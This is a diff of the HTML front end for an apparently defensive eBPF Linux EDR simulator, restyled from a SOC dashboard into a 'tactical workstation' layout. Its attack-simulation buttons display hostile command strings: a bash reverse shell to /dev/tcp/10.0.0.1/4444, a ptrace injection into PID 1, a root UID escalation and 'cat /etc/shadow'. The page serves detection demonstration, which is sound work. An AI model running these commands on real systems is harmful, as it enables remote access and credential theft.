@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>eBPF Linux EDR Sensor | Interactive SOC Simulator</title>
-  <meta name="description" content="Kernel-level Linux Endpoint Detection and Response (EDR) agent powered by eBPF syscall tracepoints and MITRE ATT&CK detection engine." />
-  
+  <title>SENTINEL-eBPF // Linux Runtime Kernel Threat Detection Workstation</title>
+  <meta name="description" content="Industrial eBPF Linux Runtime EDR Console with real-time kernel syscall tracepoints, MITRE ATT&CK mapping, and threat simulation." />
+
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
@@ -14,397 +14,302 @@
       theme: {
         extend: {
           colors: {
-            cyber: {
-              950: '#060a12',
-              900: '#0b1324',
-              850: '#111b33',
-              800: '#162342',
-              700: '#233863',
-              border: '#1e3057',
-              accent: '#38bdf8',
-              success: '#10b981',
-              warning: '#f59e0b',
-              danger: '#ef4444',
-              purple: '#a855f7'
+            tactical: {
+              950: '#070809',
+              900: '#0d0f12',
+              850: '#14171d',
+              800: '#1c2028',
+              750: '#262b36',
+              border: '#2e3543',
+              borderLight: '#3f4859',
+              amber: '#f59e0b',
+              amberGlow: '#fbbf24',
+              orange: '#f97316',
+              crimson: '#f43f5e',
+              emerald: '#10b981',
+              cyan: '#06b6d4',
+              muted: '#717b8c'
             }
           },
           fontFamily: {
-            mono: ['JetBrains Mono', 'Fira Code', 'Courier New', 'monospace'],
-            sans: ['Inter', 'system-ui', 'sans-serif']
+            mono: ['Space Mono', 'JetBrains Mono', 'Fira Code', 'Courier New', 'monospace'],
+            sans: ['Space Grotesk', 'Inter', 'system-ui', 'sans-serif'],
+            display: ['Chakra Petch', 'Orbitron', 'sans-serif']
           }
         }
       }
     }
   </script>
-  
+
   <!-- Google Fonts & Lucide Icons -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Space+Grotesk:wght@400;500;600;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
   <script src="https://unpkg.com/lucide@latest"></script>
 
   <link rel="stylesheet" href="styles.css" />
 </head>
-<body class="bg-cyber-950 text-slate-200 font-sans min-h-screen flex flex-col antialiased selection:bg-cyan-500/30 selection:text-cyan-200">
+<body class="bg-tactical-950 text-slate-200 font-sans h-screen flex flex-col antialiased selection:bg-amber-500/30 selection:text-amber-200 overflow-hidden">
 
   <!-- ===================================================================== -->
-  <!-- Top Navigation Header -->
+  <!-- Top Command HUD / Status Bar -->
   <!-- ===================================================================== -->
-  <header class="border-b border-cyber-border bg-cyber-900/90 backdrop-blur sticky top-0 z-50">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
-      <div class="flex items-center space-x-3">
-        <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/20">
-          <i data-lucide="shield-alert" class="w-5 h-5 text-white"></i>
+  <header class="h-14 bg-tactical-900 border-b border-tactical-border px-4 flex items-center justify-between shrink-0 select-none z-30">
+    <div class="flex items-center space-x-4">
+      <div class="flex items-center space-x-2.5">
+        <div class="w-7 h-7 rounded bg-amber-500/10 border border-amber-500/40 flex items-center justify-center text-amber-400 font-bold font-display text-sm tracking-wider shadow-inner">
+          <i data-lucide="shield-check" class="w-4 h-4 text-amber-400"></i>
         </div>
         <div>
-          <div class="flex items-center space-x-2">
-            <h1 class="font-bold text-white text-base sm:text-lg tracking-tight">eBPF Linux EDR Sensor</h1>
-            <span class="px-2 py-0.5 text-xs font-semibold rounded bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">v1.0.0</span>
-          </div>
-          <p class="text-xs text-slate-400 hidden sm:block">Kernel-Level Runtime Threat Detection & Telemetry Engine</p>
+          <span class="font-display font-bold text-sm tracking-wider text-amber-400 uppercase">SENTINEL-eBPF</span>
+          <span class="text-[10px] text-tactical-muted font-mono tracking-tight ml-1.5 hidden sm:inline">[KERNEL TELEMETRY CORE // DEFENSE GRID]</span>
         </div>
       </div>
 
-      <!-- Live Kernel Heartbeat & Links -->
-      <div class="flex items-center space-x-3 sm:space-x-5">
-        <div class="hidden md:flex items-center space-x-2 px-3 py-1 rounded-full bg-cyber-850 border border-cyber-border text-xs">
-          <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
-          <span class="w-2 h-2 rounded-full bg-emerald-500 -ml-3"></span>
-          <span class="text-slate-300 font-mono">eBPF HOOKS: 4 ACTIVE</span>
-          <span class="text-slate-600">|</span>
-          <span class="text-emerald-400 font-mono font-medium">RING BUFFER: 0% DROPS</span>
-        </div>
+      <div class="h-4 w-px bg-tactical-border hidden md:block"></div>
 
-        <a href="https://github.com/ravishkarathnayaka/eBPF-Powered-Linux-Runtime-Threat-Detection-EDR-Agent" target="_blank" rel="noopener" class="flex items-center space-x-1.5 px-3 py-1.5 rounded-lg bg-cyber-800 hover:bg-cyber-700 border border-cyber-border text-xs font-medium text-slate-200 transition-colors">
-          <i data-lucide="github" class="w-4 h-4"></i>
-          <span class="hidden sm:inline">GitHub Repo</span>
-        </a>
+      <!-- Quick Node Specs -->
+      <div class="hidden md:flex items-center space-x-3 text-[11px] font-mono">
+        <span class="text-tactical-muted">HOST: <strong class="text-slate-300">linux-node-01</strong></span>
+        <span class="text-tactical-border">|</span>
+        <span class="text-tactical-muted">KERNEL: <strong class="text-slate-300">6.8.0-generic (x86_64)</strong></span>
+        <span class="text-tactical-border">|</span>
+        <span class="text-tactical-muted">JIT VERIFIER: <strong class="text-emerald-400">BOUNDED &bull; 0 PANICS</strong></span>
       </div>
+    </div>
+
+    <!-- Live Telemetry & Quick Action Links -->
+    <div class="flex items-center space-x-3">
+      <!-- Ring buffer status indicator -->
+      <div class="flex items-center space-x-2 px-2.5 py-1 rounded bg-tactical-850 border border-tactical-border text-xs font-mono">
+        <span class="w-2 h-2 rounded-full bg-amber-400 animate-ping"></span>
+        <span class="w-2 h-2 rounded-full bg-amber-500 -ml-4"></span>
+        <span class="text-[11px] text-tactical-muted hidden lg:inline">RING BUFFER:</span>
+        <span id="header-ring-buffer" class="text-[11px] text-amber-300 font-bold">64 KB (0% DROPS)</span>
+      </div>
+
+      <a href="https://github.com/ravishkarathnayaka/eBPF-Powered-Linux-Runtime-Threat-Detection-EDR-Agent" target="_blank" rel="noopener" class="flex items-center space-x-1.5 px-3 py-1.5 rounded bg-tactical-850 hover:bg-tactical-800 border border-tactical-border text-xs font-mono text-slate-300 transition-colors">
+        <i data-lucide="github" class="w-3.5 h-3.5 text-amber-400"></i>
+        <span class="hidden sm:inline">Source</span>
+      </a>
     </div>
   </header>
 
   <!-- ===================================================================== -->
-  <!-- Main Application Body -->
+  <!-- 3-Column Tactical Workstation Layout -->
   <!-- ===================================================================== -->
-  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
+  <div class="flex-1 flex overflow-hidden">
 
-    <!-- KPI Metric Cards -->
-    <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
-      <div class="bg-cyber-900 border border-cyber-border rounded-xl p-4 flex items-center justify-between shadow-sm">
-        <div>
-          <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Syscall Telemetry</p>
-          <p id="metric-telemetry-count" class="text-2xl font-bold font-mono text-white mt-1">0</p>
-          <span class="text-[11px] text-cyan-400 flex items-center mt-0.5">
-            <i data-lucide="activity" class="w-3 h-3 mr-1"></i> sys_enter_*
-          </span>
-        </div>
-        <div class="w-10 h-10 rounded-lg bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400">
-          <i data-lucide="cpu" class="w-5 h-5"></i>
-        </div>
-      </div>
-
-      <div class="bg-cyber-900 border border-cyber-border rounded-xl p-4 flex items-center justify-between shadow-sm">
-        <div>
-          <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Total Detections</p>
-          <p id="metric-detection-count" class="text-2xl font-bold font-mono text-white mt-1">0</p>
-          <span class="text-[11px] text-rose-400 flex items-center mt-0.5">
-            <i data-lucide="flame" class="w-3 h-3 mr-1"></i> Active alerts
-          </span>
-        </div>
-        <div class="w-10 h-10 rounded-lg bg-rose-500/10 border border-rose-500/20 flex items-center justify-center text-rose-400">
-          <i data-lucide="shield-alert" class="w-5 h-5"></i>
-        </div>
-      </div>
-
-      <div class="bg-cyber-900 border border-cyber-border rounded-xl p-4 flex items-center justify-between shadow-sm">
-        <div>
-          <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Active Rules</p>
-          <p class="text-2xl font-bold font-mono text-white mt-1">4</p>
-          <span class="text-[11px] text-emerald-400 flex items-center mt-0.5">
-            <i data-lucide="check-circle-2" class="w-3 h-3 mr-1"></i> 100% Verified
-          </span>
-        </div>
-        <div class="w-10 h-10 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
-          <i data-lucide="file-code" class="w-5 h-5"></i>
-        </div>
-      </div>
-
-      <div class="bg-cyber-900 border border-cyber-border rounded-xl p-4 flex items-center justify-between shadow-sm">
-        <div>
-          <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">MITRE ATT&CK Matrix</p>
-          <p class="text-2xl font-bold font-mono text-purple-400 mt-1">v14</p>
-          <span class="text-[11px] text-purple-400 flex items-center mt-0.5">
-            <i data-lucide="external-link" class="w-3 h-3 mr-1"></i> Enterprise Linux
-          </span>
-        </div>
-        <div class="w-10 h-10 rounded-lg bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400">
-          <i data-lucide="network" class="w-5 h-5"></i>
-        </div>
-      </div>
-    </div>
-
-    <!-- ===================================================================== -->
-    <!-- Attack Simulation Control Deck -->
-    <!-- ===================================================================== -->
-    <section class="bg-cyber-900 border border-cyber-border rounded-xl p-5 shadow-lg relative overflow-hidden">
-      <div class="absolute -right-10 -bottom-10 w-48 h-48 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none"></div>
-
-      <div class="flex flex-col sm:flex-row sm:items-center justify-between pb-4 border-b border-cyber-border gap-2">
-        <div>
-          <div class="flex items-center space-x-2">
-            <span class="w-2.5 h-2.5 rounded-full bg-rose-500"></span>
-            <h2 class="text-base font-semibold text-white">Adversary Attack Simulation Deck</h2>
-          </div>
-          <p class="text-xs text-slate-400 mt-0.5">Click any simulated threat vector to execute adversary commands and trigger kernel tracepoints.</p>
-        </div>
-
+    <!-- ------------------------------------------------------------------- -->
+    <!-- Column 1: Left Attack Injection Rail (280px) -->
+    <!-- ------------------------------------------------------------------- -->
+    <aside class="w-72 lg:w-80 bg-tactical-900 border-r border-tactical-border flex flex-col shrink-0 overflow-y-auto select-none">
+      
+      <!-- Panel Header -->
+      <div class="p-3.5 bg-tactical-850 border-b border-tactical-border flex items-center justify-between">
         <div class="flex items-center space-x-2">
-          <button id="btn-clear-alerts" class="px-3 py-1.5 rounded-lg bg-cyber-850 hover:bg-cyber-800 border border-cyber-border text-xs text-slate-300 transition-colors flex items-center space-x-1.5">
-            <i data-lucide="trash-2" class="w-3.5 h-3.5"></i>
-            <span>Clear History</span>
-          </button>
+          <i data-lucide="crosshair" class="w-4 h-4 text-amber-400"></i>
+          <h2 class="text-xs font-display font-bold uppercase tracking-wider text-slate-200">Adversary Launchpad</h2>
         </div>
+        <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/30">KILL CHAIN</span>
       </div>
 
-      <!-- 4 Quick Attack Action Cards -->
-      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 mt-4">
+      <!-- Attack Vectors List -->
+      <div class="p-3 space-y-2.5 flex-1">
+        <div class="text-[10px] font-mono text-tactical-muted uppercase tracking-wider px-1">Active Exploit Vectors</div>
+
         <!-- Attack 1: Reverse Shell -->
-        <button onclick="triggerAttack('reverse_shell')" class="group text-left p-4 rounded-xl bg-cyber-850 hover:bg-cyber-800 border border-cyber-border hover:border-rose-500/50 transition-all duration-200 shadow-sm relative">
-          <div class="flex items-center justify-between mb-2">
-            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20 font-semibold uppercase">CRITICAL</span>
-            <span class="text-xs font-mono text-slate-400">T1059.004</span>
+        <button onclick="triggerExploit('reverse_shell')" class="w-full text-left p-3 rounded-lg bg-tactical-850 hover:bg-tactical-800 border border-tactical-border hover:border-amber-500/60 transition-all group relative overflow-hidden">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-[10px] font-mono font-bold text-crimson uppercase px-1.5 py-0.2 rounded bg-crimson/10 border border-crimson/30">SEV 1 - CRITICAL</span>
+            <span class="text-[10px] font-mono text-tactical-muted">T1059.004</span>
           </div>
-          <h3 class="font-semibold text-sm text-white group-hover:text-rose-400 transition-colors">Interactive Reverse Shell</h3>
-          <p class="text-xs text-slate-400 mt-1 font-mono line-clamp-2">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444</p>
-          <div class="mt-3 pt-2 border-t border-cyber-border/60 flex items-center justify-between text-[11px] text-cyan-400">
-            <span>Simulate Syscall</span>
-            <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
+          <div class="font-display font-bold text-xs text-white group-hover:text-amber-400 transition-colors">Reverse Shell /dev/tcp</div>
+          <div class="text-[11px] font-mono text-tactical-muted mt-1 truncate">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444</div>
+          <div class="mt-2 pt-2 border-t border-tactical-border/60 flex items-center justify-between text-[10px] font-mono text-amber-400">
+            <span>DISPATCH SYSCALL</span>
+            <i data-lucide="play" class="w-3 h-3 fill-current"></i>
           </div>
         </button>
 
         <!-- Attack 2: Process Injection -->
-        <button onclick="triggerAttack('process_injection')" class="group text-left p-4 rounded-xl bg-cyber-850 hover:bg-cyber-800 border border-cyber-border hover:border-rose-500/50 transition-all duration-200 shadow-sm relative">
-          <div class="flex items-center justify-between mb-2">
-            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20 font-semibold uppercase">CRITICAL</span>
-            <span class="text-xs font-mono text-slate-400">T1055.008</span>
+        <button onclick="triggerExploit('process_injection')" class="w-full text-left p-3 rounded-lg bg-tactical-850 hover:bg-tactical-800 border border-tactical-border hover:border-amber-500/60 transition-all group relative overflow-hidden">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-[10px] font-mono font-bold text-crimson uppercase px-1.5 py-0.2 rounded bg-crimson/10 border border-crimson/30">SEV 1 - CRITICAL</span>
+            <span class="text-[10px] font-mono text-tactical-muted">T1055.008</span>
           </div>
-          <h3 class="font-semibold text-sm text-white group-hover:text-rose-400 transition-colors">PTRACE Memory Injection</h3>
-          <p class="text-xs text-slate-400 mt-1 font-mono line-clamp-2">ptrace(PTRACE_POKETEXT, pid=1)</p>
-          <div class="mt-3 pt-2 border-t border-cyber-border/60 flex items-center justify-between text-[11px] text-cyan-400">
-            <span>Simulate Syscall</span>
-            <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
+          <div class="font-display font-bold text-xs text-white group-hover:text-amber-400 transition-colors">PTRACE Memory Injection</div>
+          <div class="text-[11px] font-mono text-tactical-muted mt-1 truncate">ptrace(PTRACE_POKETEXT, target_pid=1)</div>
+          <div class="mt-2 pt-2 border-t border-tactical-border/60 flex items-center justify-between text-[10px] font-mono text-amber-400">
+            <span>DISPATCH SYSCALL</span>
+            <i data-lucide="play" class="w-3 h-3 fill-current"></i>
           </div>
         </button>
 
         <!-- Attack 3: Privilege Escalation -->
-        <button onclick="triggerAttack('privilege_escalation')" class="group text-left p-4 rounded-xl bg-cyber-850 hover:bg-cyber-800 border border-cyber-border hover:border-amber-500/50 transition-all duration-200 shadow-sm relative">
-          <div class="flex items-center justify-between mb-2">
-            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20 font-semibold uppercase">HIGH</span>
-            <span class="text-xs font-mono text-slate-400">T1068</span>
+        <button onclick="triggerExploit('privilege_escalation')" class="w-full text-left p-3 rounded-lg bg-tactical-850 hover:bg-tactical-800 border border-tactical-border hover:border-amber-500/60 transition-all group relative overflow-hidden">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-[10px] font-mono font-bold text-amber-400 uppercase px-1.5 py-0.2 rounded bg-amber-500/10 border border-amber-500/30">SEV 2 - HIGH</span>
+            <span class="text-[10px] font-mono text-tactical-muted">T1068</span>
           </div>
-          <h3 class="font-semibold text-sm text-white group-hover:text-amber-400 transition-colors">Root Privilege Escalation</h3>
-          <p class="text-xs text-slate-400 mt-1 font-mono line-clamp-2">UID transition to 0 (root) via user shell</p>
-          <div class="mt-3 pt-2 border-t border-cyber-border/60 flex items-center justify-between text-[11px] text-cyan-400">
-            <span>Simulate Syscall</span>
-            <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
+          <div class="font-display font-bold text-xs text-white group-hover:text-amber-400 transition-colors">Root Privilege Escalation</div>
+          <div class="text-[11px] font-mono text-tactical-muted mt-1 truncate">UID transition 1000 -&gt; 0 via /bin/sh</div>
+          <div class="mt-2 pt-2 border-t border-tactical-border/60 flex items-center justify-between text-[10px] font-mono text-amber-400">
+            <span>DISPATCH SYSCALL</span>
+            <i data-lucide="play" class="w-3 h-3 fill-current"></i>
           </div>
         </button>
 
         <!-- Attack 4: Sensitive File Access -->
-        <button onclick="triggerAttack('sensitive_file')" class="group text-left p-4 rounded-xl bg-cyber-850 hover:bg-cyber-800 border border-cyber-border hover:border-amber-500/50 transition-all duration-200 shadow-sm relative">
-          <div class="flex items-center justify-between mb-2">
-            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20 font-semibold uppercase">HIGH</span>
-            <span class="text-xs font-mono text-slate-400">T1003.008</span>
+        <button onclick="triggerExploit('sensitive_file')" class="w-full text-left p-3 rounded-lg bg-tactical-850 hover:bg-tactical-800 border border-tactical-border hover:border-amber-500/60 transition-all group relative overflow-hidden">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-[10px] font-mono font-bold text-amber-400 uppercase px-1.5 py-0.2 rounded bg-amber-500/10 border border-amber-500/30">SEV 2 - HIGH</span>
+            <span class="text-[10px] font-mono text-tactical-muted">T1003.008</span>
           </div>
-          <h3 class="font-semibold text-sm text-white group-hover:text-amber-400 transition-colors">Sensitive Credential Access</h3>
-          <p class="text-xs text-slate-400 mt-1 font-mono line-clamp-2">cat /etc/shadow [O_RDONLY]</p>
-          <div class="mt-3 pt-2 border-t border-cyber-border/60 flex items-center justify-between text-[11px] text-cyan-400">
-            <span>Simulate Syscall</span>
-            <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
+          <div class="font-display font-bold text-xs text-white group-hover:text-amber-400 transition-colors">Credential Store Read</div>
+          <div class="text-[11px] font-mono text-tactical-muted mt-1 truncate">cat /etc/shadow [sys_enter_openat]</div>
+          <div class="mt-2 pt-2 border-t border-tactical-border/60 flex items-center justify-between text-[10px] font-mono text-amber-400">
+            <span>DISPATCH SYSCALL</span>
+            <i data-lucide="play" class="w-3 h-3 fill-current"></i>
+          </div>
+        </button>
+
+        <!-- Benign Control Test -->
+        <button onclick="triggerExploit('benign')" class="w-full text-left p-3 rounded-lg bg-tactical-850 hover:bg-tactical-800 border border-tactical-border hover:border-emerald-500/60 transition-all group">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-[10px] font-mono font-bold text-emerald-400 uppercase px-1.5 py-0.2 rounded bg-emerald-500/10 border border-emerald-500/30">BASELINE - BENIGN</span>
+            <span class="text-[10px] font-mono text-emerald-400">0 ALERTS</span>
+          </div>
+          <div class="font-display font-bold text-xs text-white group-hover:text-emerald-400 transition-colors">Normal Process Activity</div>
+          <div class="text-[11px] font-mono text-tactical-muted mt-1 truncate">ls -la /tmp &amp;&amp; whoami &amp;&amp; uname</div>
+          <div class="mt-2 pt-2 border-t border-tactical-border/60 flex items-center justify-between text-[10px] font-mono text-emerald-400">
+            <span>RUN CONTROL TEST</span>
+            <i data-lucide="check" class="w-3 h-3"></i>
           </div>
         </button>
       </div>
-    </section>
 
-    <!-- ===================================================================== -->
-    <!-- Two-Column Layout: Terminal + SOC Alert Stream -->
-    <!-- ===================================================================== -->
-    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+      <!-- Left Rail Footer: Telemetry Metrics -->
+      <div class="p-3 bg-tactical-850 border-t border-tactical-border text-xs font-mono space-y-1.5">
+        <div class="flex justify-between">
+          <span class="text-tactical-muted">SYS_EVENTS:</span>
+          <span id="metric-sys-count" class="text-amber-400 font-bold">0</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-tactical-muted">DETECTIONS:</span>
+          <span id="metric-alert-count" class="text-crimson font-bold">0</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-tactical-muted">LATENCY:</span>
+          <span class="text-emerald-400 font-bold">&lt; 0.04 ms</span>
+        </div>
+      </div>
+    </aside>
 
-      <!-- Left Column: Terminal & Raw eBPF Telemetry (5 cols) -->
-      <div class="lg:col-span-5 space-y-6">
+    <!-- ------------------------------------------------------------------- -->
+    <!-- Column 2: Center Dual Telemetry Scope (Terminal & eBPF Structs) -->
+    <!-- ------------------------------------------------------------------- -->
+    <main class="flex-1 flex flex-col min-w-0 bg-tactical-950 overflow-hidden border-r border-tactical-border">
+      
+      <!-- Scope Top Half: Adversary Host Console -->
+      <div class="flex-1 flex flex-col min-h-0 border-b border-tactical-border bg-tactical-950 relative">
+        <div class="h-9 px-3.5 bg-tactical-900 border-b border-tactical-border flex items-center justify-between shrink-0 select-none">
+          <div class="flex items-center space-x-2">
+            <span class="w-2 h-2 rounded-full bg-crimson"></span>
+            <span class="text-xs font-mono font-bold text-slate-300">ADVERSARY TERMINAL SCOPE</span>
+            <span class="text-[11px] font-mono text-tactical-muted">// /bin/bash (pty)</span>
+          </div>
+          <span class="text-[10px] font-mono text-tactical-muted">PID: 1337 &bull; UID: 1000</span>
+        </div>
         
-        <!-- Adversary Linux Shell Terminal -->
-        <div class="bg-cyber-900 border border-cyber-border rounded-xl overflow-hidden shadow-lg flex flex-col h-72">
-          <div class="px-4 py-2.5 bg-cyber-850 border-b border-cyber-border flex items-center justify-between">
-            <div class="flex items-center space-x-2">
-              <span class="w-2.5 h-2.5 rounded-full bg-rose-500"></span>
-              <span class="w-2.5 h-2.5 rounded-full bg-amber-500"></span>
-              <span class="w-2.5 h-2.5 rounded-full bg-emerald-500"></span>
-              <span class="text-xs font-mono text-slate-400 ml-2">adversary@victim-host:~</span>
-            </div>
-            <span class="text-[11px] font-mono text-slate-500">bash</span>
+        <!-- CRT Phosphor Terminal Window -->
+        <div id="host-terminal" class="flex-1 p-3.5 font-mono text-xs overflow-y-auto space-y-1.5 text-amber-300/90 leading-relaxed crt-screen">
+          <div class="text-tactical-muted">/* Sentinel eBPF Runtime Threat Sensor Active */</div>
+          <div class="text-tactical-muted">/* Select an exploit vector on the left rail to trigger raw system call interception */</div>
+        </div>
+      </div>
+
+      <!-- Scope Bottom Half: eBPF C-Struct Binary Event Decompiler -->
+      <div class="h-72 flex flex-col min-h-0 bg-tactical-950 relative">
+        <div class="h-9 px-3.5 bg-tactical-900 border-b border-tactical-border flex items-center justify-between shrink-0 select-none">
+          <div class="flex items-center space-x-2">
+            <i data-lucide="binary" class="w-3.5 h-3.5 text-amber-400"></i>
+            <span class="text-xs font-mono font-bold text-slate-300">KERNEL RING BUFFER DECOMPILER</span>
+            <span class="text-[10px] font-mono text-tactical-muted">// struct edr_event_t</span>
           </div>
-          <div id="terminal-content" class="flex-1 p-3.5 font-mono text-xs overflow-y-auto space-y-2 text-slate-300 bg-cyber-950">
-            <div class="text-slate-500"># System ready. Click an attack button above to emulate exploit execution...</div>
+          <div class="flex items-center space-x-2">
+            <span id="scope-syscall-badge" class="text-[10px] font-mono px-2 py-0.5 rounded bg-tactical-800 text-slate-400 border border-tactical-border">LISTENING PROBES</span>
           </div>
         </div>
 
-        <!-- Raw eBPF Kernel Event Inspector -->
-        <div class="bg-cyber-900 border border-cyber-border rounded-xl overflow-hidden shadow-lg flex flex-col h-80">
-          <div class="px-4 py-2.5 bg-cyber-850 border-b border-cyber-border flex items-center justify-between">
-            <div class="flex items-center space-x-2">
-              <i data-lucide="binary" class="w-4 h-4 text-cyan-400"></i>
-              <span class="text-xs font-semibold text-white">eBPF Telemetry Decoder (C-Struct)</span>
-            </div>
-            <span id="telemetry-badge" class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">AWAITING EVENTS</span>
-          </div>
-          <div class="flex-1 p-3.5 font-mono text-xs overflow-y-auto bg-cyber-950 text-cyan-300/90">
-            <pre id="raw-bpf-json" class="whitespace-pre-wrap">{
-  "status": "eBPF tracepoints active",
-  "maps": ["events", "event_buffer_heap"],
-  "waiting_for_syscall": true
+        <div class="flex-1 p-3 font-mono text-xs overflow-y-auto bg-tactical-950 text-emerald-400/90 leading-tight">
+          <pre id="scope-raw-json" class="whitespace-pre-wrap">{
+  "status": "BPF_PROBES_ATTACHED",
+  "tracepoints": [
+    "tracepoint/syscalls/sys_enter_execve",
+    "tracepoint/syscalls/sys_enter_connect",
+    "tracepoint/syscalls/sys_enter_ptrace",
+    "tracepoint/syscalls/sys_enter_openat"
+  ],
+  "event_buffer_heap": "PERCPU_ARRAY_INITIALIZED"
 }</pre>
-          </div>
-        </div>
-
-      </div>
-
-      <!-- Right Column: Real-Time EDR Detection Alert Feed (7 cols) -->
-      <div class="lg:col-span-7">
-        <div class="bg-cyber-900 border border-cyber-border rounded-xl shadow-lg flex flex-col min-h-[600px]">
-          
-          <!-- Alert Header & Filters -->
-          <div class="p-4 bg-cyber-850 border-b border-cyber-border flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-            <div class="flex items-center space-x-2">
-              <i data-lucide="bell-ring" class="w-5 h-5 text-rose-400"></i>
-              <h3 class="font-semibold text-white text-sm">Real-Time Threat Detection Alerts</h3>
-              <span id="alert-badge-count" class="px-2 py-0.5 text-xs font-mono font-bold rounded-full bg-rose-500/20 text-rose-300 border border-rose-500/30">0</span>
-            </div>
-
-            <!-- Severity Filter Tabs -->
-            <div class="flex items-center space-x-1.5 text-xs">
-              <button onclick="filterAlerts('ALL')" class="alert-filter-btn px-2.5 py-1 rounded-md bg-cyber-700 text-white font-medium">All</button>
-              <button onclick="filterAlerts('CRITICAL')" class="alert-filter-btn px-2.5 py-1 rounded-md bg-cyber-800 text-slate-300 hover:text-white">Critical</button>
-              <button onclick="filterAlerts('HIGH')" class="alert-filter-btn px-2.5 py-1 rounded-md bg-cyber-800 text-slate-300 hover:text-white">High</button>
-            </div>
-          </div>
-
-          <!-- Alert Cards Feed Container -->
-          <div id="alerts-container" class="flex-1 p-4 space-y-3.5 overflow-y-auto">
-            <!-- Empty state placeholder -->
-            <div id="empty-alert-state" class="h-96 flex flex-col items-center justify-center text-center p-6 border-2 border-dashed border-cyber-border rounded-xl text-slate-500 space-y-3">
-              <div class="w-12 h-12 rounded-full bg-cyber-850 flex items-center justify-center text-slate-400">
-                <i data-lucide="shield-check" class="w-6 h-6"></i>
-              </div>
-              <div>
-                <p class="text-sm font-medium text-slate-300">No Threat Detections Triggered Yet</p>
-                <p class="text-xs text-slate-500 mt-1 max-w-sm">Trigger an attack from the simulation deck above to observe kernel-level tracepoint interception and MITRE ATT&CK alert generation.</p>
-              </div>
-            </div>
-          </div>
-
         </div>
       </div>
 
-    </div>
+    </main>
 
-    <!-- ===================================================================== -->
-    <!-- Active Detection Rules & MITRE ATT&CK Matrix Explorer -->
-    <!-- ===================================================================== -->
-    <section class="bg-cyber-900 border border-cyber-border rounded-xl p-5 shadow-lg">
-      <div class="flex items-center justify-between pb-4 border-b border-cyber-border mb-4">
+    <!-- ------------------------------------------------------------------- -->
+    <!-- Column 3: Right Triage & MITRE Alert Deck (380px) -->
+    <!-- ------------------------------------------------------------------- -->
+    <section class="w-80 lg:w-96 bg-tactical-900 flex flex-col shrink-0 overflow-hidden">
+      
+      <!-- Panel Header with Filters -->
+      <div class="p-3.5 bg-tactical-850 border-b border-tactical-border flex items-center justify-between shrink-0">
         <div class="flex items-center space-x-2">
-          <i data-lucide="book-open" class="w-5 h-5 text-cyan-400"></i>
-          <h2 class="text-base font-semibold text-white">Detection Rule Catalog & MITRE ATT&CK Mapping</h2>
+          <i data-lucide="bell" class="w-4 h-4 text-crimson"></i>
+          <h3 class="text-xs font-display font-bold uppercase tracking-wider text-slate-200">Incident Triage Queue</h3>
+          <span id="triage-badge" class="px-1.5 py-0.2 rounded text-[10px] font-mono font-bold bg-crimson/20 text-crimson border border-crimson/40">0</span>
         </div>
-        <span class="text-xs font-mono text-slate-400">YAML Rule Engine</span>
+
+        <button onclick="clearIncidentLog()" title="Clear alert history" class="p-1 rounded hover:bg-tactical-800 text-tactical-muted hover:text-slate-200 transition-colors">
+          <i data-lucide="trash-2" class="w-3.5 h-3.5"></i>
+        </button>
       </div>
 
-      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
-        <!-- Rule 1 -->
-        <div class="p-4 rounded-xl bg-cyber-850 border border-cyber-border flex flex-col justify-between">
-          <div>
-            <div class="flex items-center justify-between mb-1.5">
